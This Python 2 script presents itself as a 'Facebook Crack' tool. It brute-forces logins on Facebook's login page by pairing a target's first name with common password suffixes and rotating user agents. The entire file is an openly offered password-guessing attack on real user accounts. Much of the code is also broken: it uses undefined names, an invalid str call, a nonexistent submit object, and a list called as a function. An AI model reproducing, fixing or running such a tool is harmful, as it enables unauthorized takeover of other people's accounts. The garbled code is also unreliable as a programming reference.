#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import sys
import cookielib
import random
import mechanize
import os


firstname = []
id = []
listpass = []
username = []

##### LOGO #####
logo = """\033[1;93m_/﹋\_          
\033[1;34m(🌀🌀)\033[0m
\033[1;36m<,︻╦╤─ ҉ ------------\033[0m \033[1;93m*Crack Facebook*\033[0m
\033[1;36m_/﹋\_\033[0m
\033[1;31m╔════════════════════════════════════════╗
\033[1;31m║ \033[1;93m*Author :\033[0m \033[1;97mUPIL FACEBOOK \033[0m               \033[1;31m║
\033[1;31m║ \033[1;93m*Github :\033[0m \033[1;34mhttps://github.com/aryhas\033[0m    \033[1;31m║
\033[1;31m╚════════════════════════════════════════╝\033[0m"""


nam = ["khan", "Chowdhury", "Mahmood"]

def random_fullname():
    for i in range(0,50):
         lastname = str(0, (nam)-1)
         print(firstname  + " " + lastname)


os.system('clear')
print logo
print
print 42*"\033[1;96m="
firstname = str(raw_input("\033[1;96m[+] \033[1;93mNama Depan FB \033[1;97m: "))
random_fullname()
passwordlist = str(raw_input("\033[1;96m[+] \033[1;93mWordlist \033[1;97m: "))


login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	welcome()
	search()
	print("\033[1;97mPassword does not exist in the wordlist")

	
	
def brute(password):
	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = first_name
	br.form['pass'] = password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
			print("\n\n\033[1;96m[+] Password Find = {}".format(password))
			raw_input("\033[1;31mkeluar....")
			sys.exit(1)

			
def search():
	global password
	for user in username:
		users = user.split('|')		
		ss = users[0].split(' ')
		for x in ss:
			listpass = [
				str(firstname) + '123',
				str(firstname) + '786',
				str(firstname) + '12345',
				str(firstname) + '@123',
				str(firstname) + '12',
				str(firstname) + '123456',
  				str(firstname) + '1234',
				str(firstname) + '121',
				str(firstname) + '001',
				str(firstname) + '111',
				str(firstname) + '2020',
				str(firstname) + '10',
				str(firstname)
				]
			listpass.append(passwordlist)
 			for passw in set(listpass):
				ex.submit(login,(users(1)),(passw))

		
#welcome 
def welcome():
	wel = """+=========================================+
|..........   Facebook Crack   ...........|
+-----------------------------------------+
|            #Author: UPIL FACEBOOK              | 
|	       Version 1.0                |
|   https://github.com/aryhas             |
+=========================================+
|..........  Facebook Cracker  ...........|
+-----------------------------------------+\n\n
"""
	print wel 
	print " [*] Account to crack : {}".format(firstname)
	print " [*] Loaded :" , len(listpass)
	print " [*] Cracking, please wait ...\n\n"

	
if __name__ == '__main__':
	main()
